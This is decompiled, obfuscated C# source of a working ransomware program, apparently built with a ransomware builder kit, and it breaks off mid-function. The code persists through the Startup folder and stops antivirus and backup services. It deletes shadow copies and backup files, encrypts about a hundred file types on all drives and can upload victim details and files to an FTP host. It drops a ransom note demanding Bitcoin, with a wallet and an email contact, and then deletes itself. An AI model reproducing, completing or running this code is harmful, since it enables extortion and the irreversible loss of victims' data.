using System;
using System.Collections.Generic;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Reflection;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace CvZbjvYtYnj;

internal sealed class iKytVJlqch
{
	public sealed class YsxCeCDDGPUW
	{
		private static StringCollection BtHHfQiFvSCJN = new StringCollection();

		private static List<string> ikQpiQHRRhJmx = new List<string>();

		public static List<string> SearchFiles(string string_0)
		{
			List<string> list = new List<string>();
			return WalkDirectoryTree(string_0);
		}

		private static List<string> WalkDirectoryTree(string string_0)
		{
			string[] array = null;
			string[] array2 = null;
			try
			{
				array = Directory.GetFiles(string_0, "*.*");
			}
			catch (UnauthorizedAccessException ex)
			{
				BtHHfQiFvSCJN.Add(ex.Message);
			}
			catch (DirectoryNotFoundException)
			{
			}
			if (array != null)
			{
				string[] array3 = array;
				foreach (string text in array3)
				{
					try
					{
						if (!text.ToLower().Contains("program files") && !text.ToLower().Contains("windows") && !text.ToLower().Contains("perflogs") && !text.ToLower().Contains("internet explorer"))
						{
							if (File.Exists(text) && (double)text.Length <= double.Parse(MXadTPvwWBUw) * 1024.0 * 1024.0 && ATfmkxOxvBLu == "YES")
							{
								ikQpiQHRRhJmx.Add(text);
							}
							else if (File.Exists(text) && ATfmkxOxvBLu == "NO")
							{
								ikQpiQHRRhJmx.Add(text);
							}
						}
					}
					catch
					{
					}
				}
				array2 = Directory.GetDirectories(string_0);
				string[] array4 = array2;
				foreach (string string_ in array4)
				{
					WalkDirectoryTree(string_);
				}
			}
			return ikQpiQHRRhJmx;
		}
	}

	private sealed class mLzLJJKLqbKlD
	{
		public string[] ztjghJzpkUwK;

		public string[] PdgIHLrkIIyFK;

		public string FtSEiBaUoESct;

		public string yPLqoGdEndRkj;
	}

	private sealed class cyWxqHBmVFbFp
	{
		public mLzLJJKLqbKlD NHVjZvCgLpF;

		public string VLBvgscqYeD;

		public void _003CCrypt_003Eb__6()
		{
			PcbfvMQLiqJYmJE(VLBvgscqYeD, NHVjZvCgLpF.ztjghJzpkUwK, NHVjZvCgLpF.yPLqoGdEndRkj, NHVjZvCgLpF.PdgIHLrkIIyFK, NHVjZvCgLpF.FtSEiBaUoESct);
		}
	}

	public static string BrdtHyiqLa = "EVET";

	public static byte[] fJUcawMPgUcmSe = null;

	public static string ATfmkxOxvBLu = "NO";

	public static string MXadTPvwWBUw = "100000000";

	public static List<string> tLxOlCbPrPARi = new List<string>();

	public static List<string> oqtMMHuZKV = new List<string>();

	public static string fEkrZazWqVqG = "YES";

	public static string RJSsWNEoevuQFh = "";

	public static string zsJHpiLTXeWTPH = "NO";

	public static int imYkoMPBYCGl = 0;

	public static string tMYNFdGAJS = "NO";

	public static string LUrZAENSZP = "NO";

	public static string CAJsBULjJT = "NO";

	public static string rAJNBeYhvnYue = "0";

	public static string cetbepgDNih = "NO";

	public static string xySUxnViutCd = "NO";

	public static string LoXNRDmWshAuU = "NO";

	public static string sQwqTbZidMvHbxwkL = "NO";

	public static List<string> YWrZNghbccPJthN = new List<string>
	{
		rVfznxDOJZj("bHNhc3MuZXhl"),
		rVfznxDOJZj("c3ZjaHN0LmV4ZQ=="),
		rVfznxDOJZj("Y3Jjc3MuZXhl"),
		rVfznxDOJZj("Y2hyb21lMzIuZXhl"),
		rVfznxDOJZj("ZmlyZWZveC5leGU="),
		rVfznxDOJZj("Y2FsYy5leGU="),
		rVfznxDOJZj("bXlzcWxkLmV4ZQ=="),
		rVfznxDOJZj("ZGxsaHN0LmV4ZQ=="),
		rVfznxDOJZj("b3BlcmEzMi5leGU="),
		rVfznxDOJZj("bWVtb3AuZXhl"),
		rVfznxDOJZj("c3Bvb2xjdi5leGU="),
		rVfznxDOJZj("Y3RmbW9tLmV4ZQ=="),
		rVfznxDOJZj("U2t5cGVBcHAuZXhl")
	};

	public static List<string> IFjSiTCQoDte = new List<string>();

	public static string sUoNehwoSu = "YES";

	public static string CRidIyCZxQqW = "NO";

	public static string uRzCnkyHUvL = "NO";

	public static List<string> hjYiNLJNwSGe = new List<string>();

	public static string SxySxIXQgAqeyM = "NO";

	private static string fEkRRjqcdXyowDS = "3747bdbf-0ef0-42d8-9234-70d68801f407";

	public static string wjmMcRQyRkf = "NO";

	public static string TUwiwoRgaTdHBB = "NO";

	public static List<string> zvIcCpsQyjA = new List<string>
	{
		rVfznxDOJZj("c3RvcCBhdnBzdXMgL3k="),
		rVfznxDOJZj("c3RvcCBNY0FmZWVETFBBZ2VudFNlcnZpY2UgL3k="),
		rVfznxDOJZj("c3RvcCBtZmV3YyAveQ=="),
		rVfznxDOJZj("c3RvcCBCTVIgQm9vdCBTZXJ2aWNlIC95"),
		rVfznxDOJZj("c3RvcCBOZXRCYWNrdXAgQk1SIE1URlRQIFNlcnZpY2UgL3k=")
	};

	public static List<string> PPVdvQSlVehs = new List<string>
	{
		rVfznxDOJZj("Y29uZmlnIFNRTFRFTEVNRVRSWSBzdGFydD0gZGlzYWJsZWQ="),
		rVfznxDOJZj("Y29uZmlnIFNRTFRFTEVNRVRSWSRFQ1dEQjIgc3RhcnQ9IGRpc2FibGVk"),
		rVfznxDOJZj("Y29uZmlnIFNRTFdyaXRlciBzdGFydD0gZGlzYWJsZWQ="),
		rVfznxDOJZj("Y29uZmlnIFNzdHBTdmMgc3RhcnQ9IGRpc2FibGVk")
	};

	public static List<string> hLUQZjPCLhXUU = new List<string>
	{
		rVfznxDOJZj("L0lNIG1zcHViLmV4ZSAvRg=="),
		rVfznxDOJZj("L0lNIG15ZGVza3RvcHFvcy5leGUgL0Y="),
		rVfznxDOJZj("L0lNIG15ZGVza3RvcHNlcnZpY2UuZXhlIC9G")
	};

	public static List<string> OjxrODtcNNx = new List<string>
	{
		rVfznxDOJZj("RGVsZXRlIFNoYWRvd3MgL2FsbCAvcXVpZXQ="),
		rVfznxDOJZj("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1jOiAvb249YzogL21heHNpemU9NDAxTUI="),
		rVfznxDOJZj("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1jOiAvb249YzogL21heHNpemU9dW5ib3VuZGVk"),
		rVfznxDOJZj("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1kOiAvb249ZDogL21heHNpemU9NDAxTUI="),
		rVfznxDOJZj("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1kOiAvb249ZDogL21heHNpemU9dW5ib3VuZGVk"),
		rVfznxDOJZj("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1lOiAvb249ZTogL21heHNpemU9NDAxTUI="),
		rVfznxDOJZj("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1lOiAvb249ZTogL21heHNpemU9dW5ib3VuZGVk"),
		rVfznxDOJZj("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1mOiAvb249ZjogL21heHNpemU9NDAxTUI="),
		rVfznxDOJZj("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1mOiAvb249ZjogL21heHNpemU9dW5ib3VuZGVk"),
		rVfznxDOJZj("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9NDAxTUI="),
		rVfznxDOJZj("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1nOiAvb249ZzogL21heHNpemU9dW5ib3VuZGVk"),
		rVfznxDOJZj("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9NDAxTUI="),
		rVfznxDOJZj("cmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1oOiAvb249aDogL21heHNpemU9dW5ib3VuZGVk"),
		rVfznxDOJZj("RGVsZXRlIFNoYWRvd3MgL2FsbCAvcXVpZXQ=")
	};

	public static List<string> bVtAFnzngJh = new List<string>
	{
		rVfznxDOJZj("L3MgL2YgL3EgYzpcKi5WSEQgYzpcKi5iYWMgYzpcKi5iYWsgYzpcKi53YmNhdCBjOlwqLmJrZiBjOlxCYWNrdXAqLiogYzpcYmFja3VwKi4qIGM6XCouc2V0IGM6XCoud2luIGM6XCouZHNr"),
		rVfznxDOJZj("L3MgL2YgL3EgZDpcKi5WSEQgZDpcKi5iYWMgZDpcKi5iYWsgZDpcKi53YmNhdCBkOlwqLmJrZiBkOlxCYWNrdXAqLiogZDpcYmFja3VwKi4qIGQ6XCouc2V0IGQ6XCoud2luIGQ6XCouZHNr"),
		rVfznxDOJZj("L3MgL2YgL3EgZTpcKi5WSEQgZTpcKi5iYWMgZTpcKi5iYWsgZTpcKi53YmNhdCBlOlwqLmJrZiBlOlxCYWNrdXAqLiogZTpcYmFja3VwKi4qIGU6XCouc2V0IGU6XCoud2luIGU6XCouZHNr"),
		rVfznxDOJZj("L3MgL2YgL3EgZjpcKi5WSEQgZjpcKi5iYWMgZjpcKi5iYWsgZjpcKi53YmNhdCBmOlwqLmJrZiBmOlxCYWNrdXAqLiogZjpcYmFja3VwKi4qIGY6XCouc2V0IGY6XCoud2luIGY6XCouZHNr"),
		rVfznxDOJZj("L3MgL2YgL3EgZzpcKi5WSEQgZzpcKi5iYWMgZzpcKi5iYWsgZzpcKi53YmNhdCBnOlwqLmJrZiBnOlxCYWNrdXAqLiogZzpcYmFja3VwKi4qIGc6XCouc2V0IGc6XCoud2luIGc6XCouZHNr"),
		rVfznxDOJZj("L3MgL2YgL3EgaDpcKi5WSEQgaDpcKi5iYWMgaDpcKi5iYWsgaDpcKi53YmNhdCBoOlwqLmJrZiBoOlxCYWNrdXAqLiogaDpcYmFja3VwKi4qIGg6XCouc2V0IGg6XCoud2luIGg6XCouZHNr")
	};

	public static string amIIwdIzifRi = "NO";

	public static string QARhAREvyjPnUg = "NO";

	internal static DateTime xTPEnIESlCLpXOH = new DateTime(2000, 1, 1);

	internal static DateTime TpoiCoMpXtts = new DateTime(2100, 1, 1);

	public static string xRniEPUKDVJ = "YES";

	public static string AGSHwzdGMoYH = "10";

	public static string dlhyEINAKnHITOD = "NO";

	public static string ODALgRADTAKMIxlb = "NO";

	public static string PpBgVMXHCp = "NO";

	public static string lWKrzHSoHnHuonB = "NO";

	public static string gpIXAXZuCgvU = "NO";

	public static string aoKucOAXWplH = "NO";

	public static List<string> EOnHZiqFYPIusB = new List<string> { "docx", "pdf", "xlsx", "csv" };

	public static string tSEWIBzroXuH = "NO";

	public static string XKtUrmYTjQTx = "1";

	public static string reMoWBpzmeke = "NO";

	public static string JhMVIazbJJE = "NO";

	public static string utkgjHWawXE = "NO";

	public static string uTWsIxMIjQJXmWUTV = string.Empty;

	public static string FdwymAUvojEOCc = "NO";

	public static string ydBKUGcHcvtKPv = "NO";

	public static string KPoTLmnRdCNeKAUW = "NO";

	public static string YxUwksYZrgsk = "";

	public static string fPKoJFbZIBehvs = "";

	public static string EvxqlzCDyJUXaeL = "YES";

	private static void Main(string[] args)
	{
		try
		{
			eBUobeoVBfZv.JxScJOBXzmIsEBm(fEkRRjqcdXyowDS);
		}
		catch (Exception)
		{
		}
		if (CAJsBULjJT == "YES")
		{
			Thread.Sleep(int.Parse(rAJNBeYhvnYue));
		}
		if (lWKrzHSoHnHuonB == "YES" && gpIXAXZuCgvU == "YES")
		{
			try
			{
				kxFupXNBdsSnxKc("Set-MpPreference -EnableControlledFolderAccess Disabled");
			}
			catch
			{
			}
		}
		if (LoXNRDmWshAuU == "YES" && !kJtssoTGWyfyGrKzh.esAcmNesYJ())
		{
			kJtssoTGWyfyGrKzh.HKqSBmxWUQzPthD();
		}
		if (CRidIyCZxQqW == "YES" && kJtssoTGWyfyGrKzh.esAcmNesYJ())
		{
			new VcXniFwGXSvG().oJSfQkukKv(bool_0: false);
			new VcXniFwGXSvG().GZMvQobXXUkJ();
		}
		if (LUrZAENSZP == "YES")
		{
			ZuNZmwmeape.sWxLLIqdbfXVmp();
		}
		ProcessModule mainModule = Process.GetCurrentProcess().MainModule;
		string fileName = mainModule.FileName;
		string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\";
		string text2 = text + Path.GetFileName(fileName);
		if (zsJHpiLTXeWTPH == "YES" && fileName != text2)
		{
			Thread thread = new Thread(oSBAGokwUt);
			thread.IsBackground = true;
			thread.Priority = ThreadPriority.Highest;
			thread.Start();
		}
		if (fEkrZazWqVqG == "YES" && mainModule != null && fileName != text2)
		{
			try
			{
				imYkoMPBYCGl = ksOwzFSyTaKl(0, YWrZNghbccPJthN.Count);
				File.Copy(fileName, text + YWrZNghbccPJthN[imYkoMPBYCGl], overwrite: true);
				Process.Start(text + YWrZNghbccPJthN[imYkoMPBYCGl]);
				BAYTWsjvfy();
				Process.GetCurrentProcess().Kill();
			}
			catch (Exception)
			{
			}
		}
		try
		{
			if (amIIwdIzifRi == "YES" && DateTime.Now < xTPEnIESlCLpXOH)
			{
				return;
			}
		}
		catch
		{
		}
		try
		{
			if (QARhAREvyjPnUg == "YES" && DateTime.Now > TpoiCoMpXtts)
			{
				BAYTWsjvfy();
			}
		}
		catch
		{
		}
		foreach (string item in zvIcCpsQyjA)
		{
			kCWinPnjGPfd("net.exe", item);
		}
		foreach (string pPVdvQSlVeh in PPVdvQSlVehs)
		{
			kCWinPnjGPfd("sc.exe", pPVdvQSlVeh);
		}
		foreach (string item2 in hLUQZjPCLhXUU)
		{
			kCWinPnjGPfd("taskkill.exe", item2);
		}
		foreach (string item3 in OjxrODtcNNx)
		{
			kCWinPnjGPfd("vssadmin.exe", item3);
		}
		foreach (string item4 in bVtAFnzngJh)
		{
			kCWinPnjGPfd("del.exe", item4);
		}
		UndQrBTEeaFsYqC.pcCMezlcKR();
		if (sUoNehwoSu == "YES")
		{
			ULNkSsfHoUwas.IVETbRbBNrCf();
		}
		if (dlhyEINAKnHITOD == "NO")
		{
			RJSsWNEoevuQFh = DskunZbSGBzKJT.nzQpkUAfdKgZF(32);
		}
		else
		{
			RJSsWNEoevuQFh = "M9NJRQQK666H6VPBAYWWDKH7BK9KH28A";
		}
		string text3 = wxuMsxxRNIrgV.EqaCHHUAGvytVd(RJSsWNEoevuQFh);
		IKFPbJayaZy(new string[1] { "[auto]" }, new string[100]
		{
			"dat", "txt", "jpeg", "gif", "jpg", "png", "php", "cs", "cpp", "rar",
			"zip", "html", "htm", "xlsx", "xls", "avi", "mp4", "ppt", "doc", "docx",
			"sxi", "sxw", "odt", "hwp", "tar", "bz2", "mkv", "eml", "msg", "ost",
			"pst", "edb", "sql", "accdb", "mdb", "dbf", "odb", "myd", "php", "java",
			"cpp", "pas", "asm", "key", "pfx", "pem", "p12", "csr", "gpg", "aes",
			"vsd", "odg", "raw", "nef", "svg", "psd", "vmx", "vmdk", "vdi", "lay6",
			"sqlite3", "sqlitedb", "accdb", "java", "class", "mpeg", "djvu", "tiff", "backup", "pdf",
			"cert", "docm", "xlsm", "dwg", "bak", "qbw", "nd", "tlg", "lgb", "pptx",
			"mov", "xdw", "ods", "wav", "mp3", "aiff", "flac", "m4a", "csv", "sql",
			"ora", "mdf", "ldf", "ndf", "dtsx", "rdl", "dim", "mrimg", "qbb", "rtf"
		}, new string[0], RJSsWNEoevuQFh, ".crypter");
		RJSsWNEoevuQFh = DskunZbSGBzKJT.nzQpkUAfdKgZF(32);
		using (StreamWriter streamWriter = new StreamWriter(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HELP_ME_RECOVER_MY_FILES.txt"))
		{
			streamWriter.WriteLine(rVfznxDOJZj("QXRlbnRpb24hIGFsbCB5b3VyIGltcG9ydGFudCBmaWxlcyB3ZXJlIGVuY3J5cHRlZCENCnRvIGdldCB5b3VyIGZpbGVzIGJhY2sgc2VuZCAwLjUgQml0Y29pbiBhbmQgY29udGFjdCB1cyB3aXRoIHByb29mIG9mIHBheW1lbnQgYW5kIHlvdXIgVW5pcXVlIElkZW50aWZpZXIgS2V5Lg0KV2Ugd2lsbCBzZW5kIHlvdSBhIGRlY3J5cHRpb24gdG9vbCB3aXRoIHlvdXIgcGVyc29uYWwgZGVjcnlwdGlvbiBwYXNzd29yZC4NCg0KV2hlcmUgY2FuIHlvdSBidXkgQml0Y29pbnM6DQoNCmh0dHBzOi8vd3d3LmNvaW5iYXNlLmNvbQ0KaHR0cHM6Ly9sb2NhbGJpdGNvaW5zLmNvbQ0KDQpDb250YWN0OiBjbGVhcmN1TWMwNDk5N0BnbWFpbC5jb20uDQoNCkJpdGNvaW4gd2FsbGV0IHRvIG1ha2UgdGhlIHRyYW5zZmVyIHRvIGlzOjFLZXg1UW1CR3RKTERhZ24zbzJwMXlvcXlLbjJBNkVGRzk="));
			streamWriter.WriteLine(rVfznxDOJZj("VW5pcXVlIElkZW50aWZpZXIgS2V5IChtdXN0IGJlIHNlbnQgdG8gdXMgdG9nZXRoZXIgd2l0aCBwcm9vZiBvZiBwYXltZW50KTog"));
			streamWriter.WriteLine("------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------");
			streamWriter.WriteLine(text3);
			streamWriter.WriteLine("------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------");
			if (wjmMcRQyRkf == "NO")
			{
				streamWriter.WriteLine(rVfznxDOJZj("TnVtYmVyIG9mIGZpbGVzIHRoYXQgeW91IGNvdWxkIGhhdmUgcG90ZW50aWFsbHkgbG9zdCBmb3JldmVyIGNhbiBiZSBhcyBoaWdoIGFzOiA=") + Convert.ToString(hjYiNLJNwSGe.Count));
			}
		}
		foreach (string item5 in IFjSiTCQoDte)
		{
			try
			{
				File.Copy(Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HELP_ME_RECOVER_MY_FILES.txt", item5 + "\\HELP_ME_RECOVER_MY_FILES.txt", overwrite: true);
			}
			catch (Exception)
			{
			}
		}
		if (SxySxIXQgAqeyM == "YES")
		{
			try
			{
				if (wjmMcRQyRkf == "NO")
				{
					ExWKLhwomGZ.JQmUJfoCYeNYYXdpi("ftp://files.000webhost.com/public_html/", "FTP UserName", "FTP Password", rVfznxDOJZj("Q2xpZW50IElQOiAg") + new WebClient().DownloadString(rVfznxDOJZj("aHR0cDovL2ljYW5oYXppcC5jb20=")) + rVfznxDOJZj("RGF0ZSBvZiBlbmNyeXB0aW9uOiA=") + default(DateTime).Date.ToString() + "\r\n" + rVfznxDOJZj("TnVtYmVyIG9mIGZpbGVzIGVuY3J5cHRlZDog") + Convert.ToString(hjYiNLJNwSGe.Count) + "\r\n" + rVfznxDOJZj("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA==") + "\r\n" + Convert.ToString(hjYiNLJNwSGe) + "\r\n" + rVfznxDOJZj("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog") + text3);
				}
				else
				{
					ExWKLhwomGZ.JQmUJfoCYeNYYXdpi("ftp://files.000webhost.com/public_html/", "FTP UserName", "FTP Password", rVfznxDOJZj("Q2xpZW50IElQOiAg") + new WebClient().DownloadString("aHR0cDovL2ljYW5oYXppcC5jb20=") + rVfznxDOJZj("RGF0ZSBvZiBlbmNyeXB0aW9uOiA=") + default(DateTime).Date.ToString() + "\r\n" + rVfznxDOJZj("UG9zc2libGUgYWZmZWN0ZWQgZmlsZXM6IA==") + "\r\n" + Convert.ToString(hjYiNLJNwSGe) + "\r\n" + rVfznxDOJZj("Q2xpZW50IFVuaXF1ZSBJZGVudGlmaWVyIEtleTog") + text3);
				}
			}
			catch
			{
			}
		}
		if (sQwqTbZidMvHbxwkL == "YES")
		{
			try
			{
				MRgwDjmseAr.BUUzcokODxe(new Uri("http://www.my_wallpaper_location.com/wallpaper.bmp"));
			}
			catch
			{
			}
		}
		Process.Start(rVfznxDOJZj("bm90ZXBhZC5leGU="), Environment.GetFolderPath(Environment.SpecialFolder.Desktop) + "\\HELP_ME_RECOVER_MY_FILES.txt");
		if (!string.IsNullOrEmpty(uTWsIxMIjQJXmWUTV))
		{
			try
			{
				File.Delete(uTWsIxMIjQJXmWUTV);
			}
			catch
			{
			}
		}
		if (BrdtHyiqLa == "EVET")
		{
			BAYTWsjvfy();
		}
	}

	public static void oSBAGokwUt()
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show(rVfznxDOJZj("VGhpcyBwcm9ncmFtIHJlcXVpcmVzIE1pY3Jvc29mdCAuTkVUIEZyYW1ld29yayB2LiA0LjgyIG9yIHN1cGVyaW9yIHRvIHJ1biBwcm9wZXJseQ=="), rVfznxDOJZj("QXRlbnRpb24h"), (MessageBoxButtons)0, (MessageBoxIcon)16);
	}

	private static int ksOwzFSyTaKl(int int_0, int int_1)
	{
		RNGCryptoServiceProvider rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
		byte[] array = new byte[4];
		rNGCryptoServiceProvider.GetBytes(array);
		int seed = BitConverter.ToInt32(array, 0);
		return new Random(seed).Next(int_0, int_1);
	}

	public static List<string> BLtDAkKlgBaYW(string string_0)
	{
		List<string> list = new List<string>();
		Stack<string> stack = new Stack<string>(20);
		if (!Directory.Exists(string_0))
		{
			throw new ArgumentException();
		}
		stack.Push(string_0);
		while (stack.Count > 0)
		{
			string text = stack.Pop();
			string[] directories;
			try
			{
				directories = Directory.GetDirectories(text);
			}
			catch (UnauthorizedAccessException)
			{
				continue;
			}
			catch (DirectoryNotFoundException)
			{
				continue;
			}
			catch (PathTooLongException)
			{
				continue;
			}
			catch
			{
				continue;
			}
			string[] array = null;
			try
			{
				if (!text.ToLower().Contains("program files") && !text.ToLower().Contains("windows") && !text.ToLower().Contains("perflogs") && !text.ToLower().Contains("internet explorer"))
				{
					array = Directory.GetFiles(text);
					goto IL_00bc;
				}
			}
			catch (UnauthorizedAccessException)
			{
			}
			catch (DirectoryNotFoundException)
			{
			}
			catch
			{
			}
			continue;
			IL_00bc:
			string[] array2 = array;
			foreach (string fileName in array2)
			{
				try
				{
					FileInfo fileInfo = new FileInfo(fileName);
					if (File.Exists(fileInfo.FullName) && (double)fileInfo.Length <= double.Parse(MXadTPvwWBUw) * 1024.0 * 1024.0 && ATfmkxOxvBLu == "YES")
					{
						list.Add(fileInfo.FullName);
					}
					else if (File.Exists(fileInfo.FullName) && ATfmkxOxvBLu == "NO")
					{
						list.Add(fileInfo.FullName);
					}
				}
				catch (FileNotFoundException)
				{
				}
				catch (PathTooLongException)
				{
				}
				catch
				{
				}
			}
			string[] array3 = directories;
			foreach (string item in array3)
			{
				stack.Push(item);
			}
		}
		return list;
	}

	public static string kCWinPnjGPfd(string LJupmBelYwdsIkT = "", string PymixJTgLMvZXmiI = "")
	{
		string result = "";
		try
		{
			Process process = new Process();
			process.StartInfo = new ProcessStartInfo
			{
				WindowStyle = ProcessWindowStyle.Hidden,
				CreateNoWindow = true,
				FileName = LJupmBelYwdsIkT,
				Arguments = PymixJTgLMvZXmiI,
				UseShellExecute = false,
				RedirectStandardOutput = true,
				StandardOutputEncoding = Encoding.GetEncoding(850)
			};
			Process process2 = process;
			process2.Start();
			result = process2.StandardOutput.ReadToEnd();
			process2.WaitForExit();
			return result;
		}
		catch
		{
			return result;
		}
	}

	public static void kxFupXNBdsSnxKc(string string_0)
	{
		Process process = new Process();
		process.StartInfo = new ProcessStartInfo
		{
			FileName = "powershell",
			Arguments = string_0,
			WindowStyle = ProcessWindowStyle.Hidden,
			CreateNoWindow = true
		};
		Process process2 = process;
		process2.Start();
	}

	public static string rVfznxDOJZj(string string_0)
	{
		byte[] bytes = Convert.FromBase64String(string_0);
		return Encoding.UTF8.GetString(bytes);
	}

	public static void BAYTWsjvfy()
	{
		string text = rVfznxDOJZj("L0MgY2hvaWNlIC9DIFkgL04gL0QgWSAvVCAzICYgRGVsIA==");
		ProcessStartInfo processStartInfo = new ProcessStartInfo();
		processStartInfo.Arguments = "\"" + text + "\"" + Assembly.GetEntryAssembly()!.Location;
		processStartInfo.WindowStyle = ProcessWindowStyle.Hidden;
		processStartInfo.CreateNoWindow = true;
		processStartInfo.FileName = "cmd.exe";
		Process.Start(processStartInfo);
		Environment.Exit(0);
	}

	private static void IKFPbJayaZy(string[] string_0, string[] string_1, string[] string_2, string string_3, string string_4)
	{
		mLzLJJKLqbKlD mLzLJJKLqbKlD = new mLzLJJKLqbKlD();
		mLzLJJKLqbKlD.ztjghJzpkUwK = string_1;
		mLzLJJKLqbKlD.PdgIHLrkIIyFK = string_2;
		mLzLJJKLqbKlD.FtSEiBaUoESct = string_3;
		mLzLJJKLqbKlD.yPLqoGdEndRkj = string_4;
		fJUcawMPgUcmSe = Encoding.ASCII.GetBytes(mLzLJJKLqbKlD.FtSEiBaUoESct);
		if (string_0[0] == "[auto]")
		{
			DriveInfo[] drives = DriveInfo.GetDrives();
			if (drives.Length > 0)
			{
				for (int i = 0; i < drives.Length; i++)
				{
					if (drives[i].IsReady)
					{
						tLxOlCbPrPARi.Add(drives[i].Name);
					}
				}
			}
		}
		else
		{
			for (int j = 0; j < string_0.Length; j++)
			{
				tLxOlCbPrPARi.Add(string_0[j]);
			}
		}
		using List<string>.Enumerator enumerator = tLxOlCbPrPARi.GetEnumerator();
		while (enumerator.MoveNext())
		{
			cyWxqHBmVFbFp CS_0024_003C_003E8__locals0 = new cyWxqHBmVFbFp();
			CS_0024_003C_003E8__locals0.NHVjZvCgLpF = mLzLJJKLqbKlD;
			CS_0024_003C_003E8__locals0.VLBvgscqYeD = enumerator.Current;
			if (wjmMcRQyRkf == "YES")
			{
				Thread thread = new Thread((ThreadStart)delegate
				{
					PcbfvMQLiqJYmJE(CS_0024_003C_003E8__locals0.VLBvgscqYeD, CS_0024_003C_003E8__locals0.NHVjZvCgLpF.ztjghJzpkUwK, CS_0024_003C_003E8__locals0.NHVjZvCgLpF.yPLqoGdEndRkj, CS_0024_003C_003E8__locals0.NHVjZvCgLpF.PdgIHLrkIIyFK, CS_0024_003C_003E8__locals0.NHVjZvCgLpF.FtSEiBaUoESct);
				});
				thread.Priority = ThreadPriority.Highest;
				thread.IsBackground = false;
				thread.Start();
				thread.Join();
			}
			else
			{
				PcbfvMQLiqJYmJE(CS_0024_003C_003E8__locals0.VLBvgscqYeD, mLzLJJKLqbKlD.ztjghJzpkUwK, mLzLJJKLqbKlD.yPLqoGdEndRkj, mLzLJJKLqbKlD.PdgIHLrkIIyFK, mLzLJJKLqbKlD.FtSEiBaUoESct);
			}
		}
	}

	public static void PcbfvMQLiqJYmJE(string string_0, string[] string_1, string string_2, string[] string_3, string string_4)
	{
		if (!Directory.Exists(string_0))
		{
			return;
		}
		List<string> list = new List<string>();
		list = ((!(JhMVIazbJJE == "YES")) ? YsxCeCDDGPUW.SearchFiles(string_0) : BLtDAkKlgBaYW(string_0));
		foreach (string value in string_1)
		{
			foreach (string item in list)
			{
				if (string_3.Length != 0)
				{
					foreach (string value2 in string_3)
					{
						if (EvxqlzCDyJUXaeL == "YES")
						{
							if (!item.ToLower().EndsWith(value2))
							{
								continue;
							}
						}
						else if (!item.EndsWith(value2))
						{
							continue;
						}
						goto IL_03a3;
					}
				}
				if (EvxqlzCDyJUXaeL == "YES")
				{
					if (!item.ToLower().EndsWith(value) || item.Contains("HELP_ME_RECOVER_MY_FILES") || item.Contains("RansomBuilder_Log") || item.Contains("RSAKeys") || item.ToLower().Contains("program files") || item.ToLower().Contains("windows") || item.ToLower().Contains("internet explorer"))
					{
						continue;
					}
				}
				else if (!item.EndsWith(value) || item.Contains("HELP_ME_RECOVER_MY_FILES") || item.Contains("RansomBuilder_Log") || item.Contains("RSAKeys") || item.ToLower().Contains("program files") || item.ToLower().Contains("windows") || item.ToLower().Contains("internet explorer"))
				{
					continue;
				}
				if (hjYiNLJNwSGe.Contains(item))
				{
					continue;
				}
				if (tMYNFdGAJS == "YES")
				{
					try
					{
						if (TifFtHlFaa.eJmNtiqhpcSciCE(item))
						{
							TifFtHlFaa.dhdIiPVNtMJMY(item);
						}
					}
					catch
					{
					}
				}
				hjYiNLJNwSGe.Add(item);
				if (!IFjSiTCQoDte.Contains(Path.GetDirectoryName(item)))
				{
					IFjSiTCQoDte.Add(Path.GetDirectoryName(item));
				}
				try
				{
					FileStream fileStream = new FileStream(item, FileMode.Open, FileAccess.Read, FileShare.ReadWrite);
					if (xRniEPUKDVJ == "YES" && fileStream.Length > Convert.ToInt32(AGSHwzdGMoYH) * 1024 * 1024)
					{
						if (aoKucOAXWplH == "YES")
						{
							foreach (string item2 in EOnHZiqFYPIusB)
							{
								if (item.EndsWith(item2) && tSEWIBzroXuH == "YES" && Convert.ToInt32(XKtUrmYTjQTx) * 1024 * 1024 > fileStream.Length)
								{
									try
									{
										ExWKLhwomGZ.fjRHSuDjwIHH("ftp://files.000webhost.com/public_html/", "FTP UserName", "ACCESS", item);
									}
									catch
									{
									}
								}
							}
						}
						byte[] byte_ = KKsUAAZYdwoEvri.DBYyKPCdnOjf(item, Convert.ToInt32(AGSHwzdGMoYH) * 1024 * 1024);
						byte[] byte_2 = KKsUAAZYdwoEvri.XjiGPUbmCJ(byte_, Encoding.ASCII.GetBytes(string_4), new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 });
						KKsUAAZYdwoEvri.GaBjWIBjYQjPkk(item, byte_2);
						if (string_2 != ".*")
						{
							File.Move(item, item + string_2);
						}
					}
					else if (string_2 != ".*")
					{
						mAYaZPykNFqT(item, item + string_2, fJUcawMPgUcmSe);
					}
					else
					{
						mAYaZPykNFqT(item, item + ".part", fJUcawMPgUcmSe);
					}
				}
				catch (Exception)
				{
				}
				IL_03a3:;
			}
		}
	}

	private static void mAYaZPykNFqT(string string_0, string string_1, byte[] byte_0)
	{
		try
		{
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
